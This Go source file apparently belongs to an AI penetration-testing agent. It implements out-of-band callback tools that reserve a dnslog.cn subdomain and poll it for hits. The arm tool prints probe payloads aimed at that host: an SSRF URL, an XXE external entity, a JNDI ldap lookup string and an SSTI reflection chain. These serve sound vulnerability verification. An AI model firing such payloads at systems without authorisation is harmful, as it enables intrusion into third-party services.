package agent

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

// OOB（带外回连）：盲 SSRF、盲 XXE、盲命令注入、JNDI、SSTI 全靠"目标回来找你"才能确认。
//
// 这里用 dnslog.cn 的公开通道，不需要 API key：先 arm 拿一个专属子域，再把子域塞进载荷，
// 目标一旦解析/访问，check 就能读到来源 IP 与时间。所有会话按 token 存在进程内存里。

const (
	oobProvider      = "http://www.dnslog.cn"
	oobMaxSessions   = 32
	oobMaxRecords    = 200
	oobPollInterval  = 2 * time.Second
	oobSessionTTL    = 2 * time.Hour
	oobMaxWaitSecond = 60
)

type oobSession struct {
	token    string
	label    string
	domain   string
	jar      http.CookieJar
	client   *http.Client
	records  []string
	armedAt  time.Time
	polls    int
}

var oobStore = struct {
	sync.Mutex
	m map[string]*oobSession
}{m: make(map[string]*oobSession)}

func newOOBToken() string {
	buf := make([]byte, 4)
	if _, err := rand.Read(buf); err != nil {
		return fmt.Sprintf("o%x", time.Now().UnixNano()&0xffffffff)
	}
	return hex.EncodeToString(buf)
}

func (t *ToolSet) oobArm() actool.CoreTool {
	return readTool("oob_arm",
		"开一个带外回连监听：向 dnslog.cn 申请一个专属子域，返回 token 和域名。把域名拼进盲打载荷（SSRF 的 http://<随机>.<域名>/、XXE 的外部实体、JNDI 的 ldap://<随机>.<域名>/、SSTI 的命令注入），然后用 oob_check 收结果。不需要任何 API key。",
		obj(map[string]any{
			"label": str("这次监听的用途备注，例如 ssrf-imageurl / xxe-oob，仅用于你自己看"),
		}), func(ctx context.Context, raw json.RawMessage) (actool.Result, error) {
			var in struct {
				Label string `json:"label"`
			}
			_ = json.Unmarshal(raw, &in)

			jar, err := cookiejar.New(nil)
			if err != nil {
				return actool.Errorf("cookie jar: " + err.Error()), nil
			}
			base := reconClient(20 * time.Second)
			client := &http.Client{Jar: jar, Timeout: 20 * time.Second}
			if base != nil {
				client.Transport = base.Transport
			}
			req, _ := http.NewRequestWithContext(ctx, http.MethodGet, oobProvider+"/getdomain.php", nil)
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ARTEX)")
			resp, err := client.Do(req)
			if err != nil {
				return actool.Errorf("申请 dnslog 子域失败：" + err.Error() + "（该通道不可用时，改用目标自带的回调点或自建监听）"), nil
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			domain := strings.TrimSpace(string(body))
			if !strings.Contains(domain, ".") {
				return actool.Errorf("dnslog 返回异常：" + string(body)), nil
			}

			token := newOOBToken()
			now := time.Now()
			oobStore.Lock()
			for k, s := range oobStore.m {
				if now.Sub(s.armedAt) > oobSessionTTL {
					delete(oobStore.m, k)
				}
			}
			if len(oobStore.m) >= oobMaxSessions {
				oldestKey, oldest := "", now
				for k, s := range oobStore.m {
					if s.armedAt.Before(oldest) {
						oldestKey, oldest = k, s.armedAt
					}
				}
				if oldestKey != "" {
					delete(oobStore.m, oldestKey)
				}
			}
			oobStore.m[token] = &oobSession{token: token, label: in.Label, domain: domain, jar: jar, client: client, armedAt: now}
			oobStore.Unlock()

			out := &strings.Builder{}
			fmt.Fprintf(out, "监听已开\ntoken: %s\n域名: %s\n\n", token, domain)
			out.WriteString("载荷示例（把 token 段随手换掉都行，能解析到这个域就算回连）：\n")
			fmt.Fprintf(out, "  SSRF : http://%s.%s/\n", token, domain)
			fmt.Fprintf(out, "  XXE  : <!ENTITY xxe SYSTEM \"http://%s.%s/\">\n", token, domain)
			fmt.Fprintf(out, "  JNDI : ${jndi:ldap://%s.%s/a}\n", token, domain)
			fmt.Fprintf(out, "  SSTI : {\"a\".getClass().forName(\"java.net.URL\").getMethod(\"getContent\").invoke(\"http://%s.%s/\")}\n", token, domain)
			out.WriteString("\n发完载荷后用 oob_check 收结果，token 原样带过去。DNS 只证明目标解析过，要落报告还要拿到 HTTP 回连或解析来源 IP。\n")
			return actool.Text(out.String()), nil
		})
}

func (t *ToolSet) oobCheck() actool.CoreTool {
	return readTool("oob_check",
		"查带外回连结果：按 oob_arm 给的 token 轮询，返回命中记录（解析来源 IP、时间、子域原文）。wait_seconds 内轮询，超时就返回已有结果。",
		obj(map[string]any{
			"token":        str("oob_arm 返回的 token"),
			"wait_seconds": map[string]any{"type": "integer", "description": "最多等多少秒，默认 15，上限 60"},
		}, "token"), func(ctx context.Context, raw json.RawMessage) (actool.Result, error) {
			var in struct {
				Token string `json:"token"`
				Wait  int    `json:"wait_seconds"`
			}
			if err := json.Unmarshal(raw, &in); err != nil {
				return actool.Errorf("参数解析失败：" + err.Error()), nil
			}
			token := strings.TrimSpace(in.Token)
			oobStore.Lock()
			s := oobStore.m[token]
			oobStore.Unlock()
			if s == nil {
				return actool.Errorf("token " + token + " 不存在或已过期，先调 oob_arm"), nil
			}
			wait := 15
			if in.Wait > 0 {
				wait = in.Wait
			}
			if wait > oobMaxWaitSecond {
				wait = oobMaxWaitSecond
			}
			deadline := time.Now().Add(time.Duration(wait) * time.Second)

			for {
				fresh, err := s.pollRecords(ctx)
				if err == nil && len(fresh) > 0 {
					break
				}
				if time.Now().After(deadline) {
					break
				}
				select {
				case <-ctx.Done():
				case <-time.After(oobPollInterval):
				}
			}

			oobStore.Lock()
			all := append([]string{}, s.records...)
			label, domain, polls := s.label, s.domain, s.polls
			oobStore.Unlock()

			out := &strings.Builder{}
			fmt.Fprintf(out, "监听: %s  域名: %s  轮询 %d 次\n", dashIfEmpty(label, "-"), domain, polls)
			if len(all) == 0 {
				out.WriteString("暂无回连。可能原因：目标出网被拦、载荷没被解析、或回连还在路上（再等一轮）。\n")
				return actool.Text(strings.TrimRight(out.String(), "\n")), nil
			}
			sort.Strings(all)
			fmt.Fprintf(out, "命中 %d 条：\n", len(all))
			for _, r := range all {
				fmt.Fprintf(out, "  %s\n", r)
			}
			out.WriteString("\n回连是强证据：DNS 命中证明目标替你解析了域名（盲 SSRF/XXE/注入成立）；只有 DNS 没有 HTTP 时，报告要写明「仅证明 DNS 出网」。\n")
			return actool.Text(strings.TrimRight(out.String(), "\n")), nil
		})
}

func (s *oobSession) pollRecords(ctx context.Context) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, oobProvider+"/getrecords.php", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ARTEX)")
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	recs := parseOOBRecords(raw)
	oobStore.Lock()
	defer oobStore.Unlock()
	s.polls++
	seen := make(map[string]struct{}, len(s.records))
	for _, r := range s.records {
		seen[r] = struct{}{}
	}
	var fresh []string
	for _, r := range recs {
		if _, ok := seen[r]; ok {
			continue
		}
		s.records = append(s.records, r)
		fresh = append(fresh, r)
	}
	if len(s.records) > oobMaxRecords {
		s.records = s.records[len(s.records)-oobMaxRecords:]
	}
	return fresh, nil
}

// parseOOBRecords 吃 dnslog.cn 的 JSON 数组；兼容空响应与 HTML 错误页。
func parseOOBRecords(raw []byte) []string {
	body := strings.TrimSpace(string(raw))
	if body == "" || body[0] != '[' {
		return nil
	}
	var arr []any
	if err := json.Unmarshal([]byte(body), &arr); err != nil {
		return nil
	}
	out := make([]string, 0, len(arr))
	for _, v := range arr {
		switch x := v.(type) {
		case string:
			if s := strings.TrimSpace(x); s != "" {
				out = append(out, s)
			}
		case []any:
			parts := make([]string, 0, len(x))
			for _, p := range x {
				parts = append(parts, fmt.Sprint(p))
			}
			if joined := strings.TrimSpace(strings.Join(parts, " ")); joined != "" {
				out = append(out, joined)
			}
		}
	}
	return out
}

func dashIfEmpty(s, fallback string) string {
	if strings.TrimSpace(s) == "" {
		return fallback
	}
	return s
}

// oobRecordHost 从一条记录里挑出主机名，供埋点时校验载荷是否真的带上了 token。
func oobRecordHost(rec string) string {
	for _, f := range strings.Fields(rec) {
		if strings.Contains(f, ".") {
			if u, err := url.Parse(f); err == nil && u.Host != "" {
				return u.Host
			}
			return f
		}
	}
	return ""
}
